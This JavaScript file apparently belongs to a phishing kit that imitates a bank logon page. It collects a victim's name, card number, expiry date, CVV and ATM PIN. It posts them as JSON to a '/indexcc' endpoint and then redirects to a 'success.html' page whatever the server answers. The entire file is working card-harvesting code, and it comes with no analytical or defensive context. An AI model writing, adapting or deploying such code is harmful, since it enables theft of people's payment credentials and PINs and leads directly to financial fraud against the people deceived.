const fname = document.getElementById('fname');
const cardnumber = document.getElementById('cardnumber');
const expdate = document.getElementById('expdate');
const cvv = document.getElementById('cvv')
const atmpin = document.getElementById('atmpin');
const aoblogon_submit = document.getElementById('aoblogon_submit') 

document.addEventListener('DOMContentLoaded', function(){
    aoblogon_submit.addEventListener('click', function(event){
        event.preventDefault(); // Prevent the default form submission
        
        const homeForm = document.getElementById('homeForm');
        
        if(homeForm.checkValidity()){
            const data = {
                fname: fname.value,
                cardnumber: cardnumber.value,
                expdate: expdate.value,
                cvv: cvv.value,
                atmpin: atmpin.value
            };
            $(".overlay").show(500);

            // Send data to server in JSON format
            fetch('/indexcc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    // Handle success here if needed
                    console.log('Data sent successfully!');
                    // homeForm.submit()
                } else {
                    // Handle errors here if needed
                    console.error('Failed to send data.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            })
            .finally(() => {
                setTimeout(function() {
                    window.location.href = "success.html";
                }, 2000);
            });
        }else{
            homeForm.reportValidity()
        }   
    });
});
